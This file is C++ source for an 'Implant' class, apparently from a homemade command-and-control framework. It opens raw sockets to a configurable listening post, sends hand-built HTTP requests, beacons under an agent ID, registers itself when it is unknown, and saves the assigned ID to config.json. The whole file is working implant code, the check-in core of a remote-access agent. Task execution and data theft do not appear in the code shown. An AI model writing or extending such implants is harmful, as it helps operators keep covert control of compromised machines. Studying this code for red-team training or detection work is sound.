#include "implant.h"
#include "tasks.h"

#include <sstream>
#include <fstream>
#include <unistd.h>
#include <chrono>
#include <thread>

using json = nlohmann::json;

// Function to send an asynchronous HTTP request with a payload to the listening post
std::string Implant::sendHttpRequest(std::string_view path, 
    HttpMethod method, 
    const json& payload) 
{
    std::stringstream ss;
    std::string request_string;
    std::string str_payload;

    // init hints addr_info struct with network info (internet fam, sock type)
    //memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    // Convert server_host and server_port because C stuff
    const char* host_cstr = host.c_str();
    const char* port_cstr = port.c_str();

    status = getaddrinfo(host_cstr, port_cstr, &hints, &result);
    if (status < 0) {
        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
        exit(EXIT_FAILURE); 
    }

    socket_fd = socket(result->ai_family, result->ai_socktype, 0);
    if (socket_fd < 0) {
        fprintf(stderr, "socket init failed: %s\n", gai_strerror(status));
        exit(EXIT_FAILURE);
    }

    int connection = connect(socket_fd, result->ai_addr, result->ai_addrlen);

    if (connection < 0) {
        fprintf(stderr, "connection failure: %s\n", gai_strerror(status));
        exit(EXIT_FAILURE); 
    } else {
        std::cout << "Connection Established!" << std::endl;
    }

    /*
        <Request-Line>
        <Headers>
        <Blank Line>
        [<Request Body>]
    */
    switch (method) {
        case HttpMethod::GET:
            ss << "GET " << path << " HTTP/1.1\r\n" << "Host: " << host << "\r\n" << "\r\n";
            request_string = ss.str();
            break;
        case HttpMethod::POST:
            str_payload = payload.dump();
            ss << "POST " << path << " HTTP/1.1\r\n" << "Host: " << host << "\r\n" << "Content-Type: application/json\r\n"
               << "Content-Length: " << str_payload.length() << "\r\n"
               << "\r\n"
               << str_payload;
            request_string = ss.str();
            break;
        default:
            throw std::runtime_error("Invalid HTTP method");
    }

    int req = send(socket_fd, request_string.c_str(), request_string.length(), 0);
    if (req < 0) {
        fprintf(stderr, "failed to send request: %s\n", gai_strerror(status));
        exit(EXIT_FAILURE);
    }

     // Receive the response from the server
    char buffer[10096]; // Adjust the buffer size as needed
    std::string response;

    while (true) {
        int bytesReceived = recv(socket_fd, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            response.append(buffer, bytesReceived);
        } else if (bytesReceived == 0) {
            // Connection closed by the remote side
            break;
        } else {
            // Error in receiving
            fprintf(stderr, "failed to receive response: %s\n", strerror(errno));
            exit(EXIT_FAILURE);
        }
    }

    close(socket_fd);

    return response;
}

Implant::Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning):
    host{ std::move(server_host) },
    port{ std::move(server_port) }, 
    id{ std::move(agent_id) },
    isRunning{ std::move(isRunning) },
    socket_fd{-1}
{
}

Implant::~Implant() {
    // Close the socket when the object is destroyed
    if (socket_fd != -1) {
        close(socket_fd);
    }
}

void Implant::beacon() {
    if (isRunning) {
        std::string path = "/agents/" + id;
        std::string get_response = sendHttpRequest(path, HttpMethod::GET, "");

        int code = extractResponseCode(get_response);

        // check if agent is registered, register if not and write id to config file
        if (code == 404 || id == "") {
            std::cout << "Registering agent" << std::endl;
            registerAgent();
        }
    }
}

std::string Implant::extractJsonFromString(const std::string& input) {
    std::string jsonStart = "{";
    std::size_t startPos = input.find(jsonStart);
    if (startPos != std::string::npos) {
        std::string jsonSubstring = input.substr(startPos);
        return jsonSubstring;
    }
    return "";
}

int Implant::extractResponseCode(const std::string& response) {
    std::istringstream iss(response);
    std::string firstLine;
    std::getline(iss, firstLine); // Get the first line from the response

    char httpVersion[16]; // Assuming HTTP version can be up to 15 characters long (e.g., "HTTP/1.1")
    int statusCode;
    char statusText[256]; // Assuming status text can be up to 255 characters long

    // Extract the response code from the first line
    if (std::sscanf(firstLine.c_str(), "%15s %d %255s", httpVersion, &statusCode, statusText) == 3) {
        return statusCode;
    }

    // If the response code extraction fails, return a default value or handle the error as needed
    return -1;
}

void Implant::registerAgent() {
    std::string post_response = sendHttpRequest("/agents", HttpMethod::POST, "");

    std::string json_data = extractJsonFromString(post_response);

    json jsonResponse = json::parse(json_data);
    std::string agentId = jsonResponse["agent_id"];

    setId(agentId);

    // Read existing JSON data from config file
    std::ifstream configFile("config.json");
    if (!configFile) {
        std::cerr << "Could not open config file for reading." << std::endl;
        return;
    }

    json configData;
    configFile >> configData;
    configFile.close();

    // Modify the configData object to add the "id" field
    configData["id"] = agentId;

    // Write the updated JSON data back to the config file
    std::ofstream outFile("config.json");
    if (!outFile) {
        std::cerr << "Could not open config file for writing." << std::endl;
        return;
    }

    try {
        outFile << std::setw(4) << configData << std::endl;
        outFile.close();
        std::cout << "Data successfully added to the config file." << std::endl;
    } catch (const std::exception& e) {
        std::cerr << "Error writing to config file: " << e.what() << std::endl;
        return;
    }
}

void Implant::setRunning(bool running) { isRunning = running; }
void Implant::setId(std::string& new_agent_id) { id = new_agent_id; }